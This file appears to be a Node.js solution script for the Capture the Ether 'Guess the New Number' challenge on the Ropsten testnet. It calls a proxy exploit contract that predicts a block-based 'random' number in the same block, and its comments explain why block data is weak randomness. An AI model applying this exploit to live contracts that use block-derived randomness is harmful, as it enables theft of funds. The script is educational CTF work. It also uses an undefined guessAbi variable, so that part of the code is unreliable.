/**
 * INSTRUCTIONS
 *
 * 1. Deploy ProxyContract by running `truffle migrate --network ropsten`
 * 2. Copy ProxyContract address to variable below
 * 3. Copy GuessTheNewNumberChallenge address (from capturetheether) to variable below
 * 4. All good, run this file
 * 5. Actually, because we didn't define gasPrice the transaction will take ages.. More than
 * 12mins it took (eventually it did run). Next time estimate gasPrice before. Or just add a
 * reasonable static value, the remaining gas not used will be refunded anyway.
 *
 * SOLUTION
 *
 * The answer is calculated at run time so unless we somehow know (see §note below) which block
 * will execute the `guess` function, then it's impossible to figure out the number. The plan here
 * is to cleate an exploit / proxy contract that will call the `guess` function. Because both 'win'
 * and `guess` function will be called virtually at the same time, the block will also be the same.
 *
 *
 * § If we mine the blocks ourself, we can inject transaction with a timestamp that we will use
 * in our current block header. This is related to miner front-running commonly found in
 * decentralized exchange implementation. That is, miner might have mis-aligned incentive when
 * transactions are public and the transaction has economic value. They can sway miners’ behaviors
 * away from fair incentive provided by gas collected in the block. Therefore it is almost never
 * a good idea to use block hash or timestamp as a source of randomness whether or not it could be
 * programmatically exploited or not.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./4_guess_the_new_number_ropsten/build/contracts/ProxyContract.json")
).abi;


// replace contract address, given by capturetheether challenge
const guessContractAddress = "0x5f9C2CB9aa6A6Bce8cB736C200e3AF19179D2e42";
// replace contract address after running `truffle migrate --network ropsten`
const proxyContractAddress = "0xA72651f9D63Bea6A29649F5a0d26e80522Ce6af0";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(guessContractAddress, (_, balance) => {
    console.log(
      "GuessContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const amountToSend = Web3Utils.toWei("1", "ether");

    outputBalances(accounts[0]);

    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    proxyContract.methods
      .win(guessContractAddress)
      .send({ from: accounts[0], value: amountToSend })
      .then((res) => {
        console.log(res);

        // just curious about what the answer was
        proxyContract.methods
          .getLastAnswer()
          .call()
          .then((answer) => console.log("Answer: " + answer));

        const guessContract = new web3.eth.Contract(
          guessAbi,
          guessContractAddress
        );
        // did guess contract consider the answer correct?
        guessContract.methods
          .isComplete()
          .call()
          .then((res) => console.log("Is complete: " + res));

        // return ether expenses to original account
        proxyContract.methods
          .destroy()
          .send({ from: accounts[0] })
          .then(() => {
            outputBalances(accounts[0]);
          });
      });

    // Ended up having to call the `destroy` function as below cause the original
    // `win` function call took ages and node timed out. Notice I've set a gasPrice
    // this time.

    // proxyContract.methods
    //   .destroy()
    //   .send({ from: accounts[0], gasPrice: Web3Utils.toWei("4", "gwei") })
    //   .then(() => {
    //     outputBalances(accounts[0]);
    //   });
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
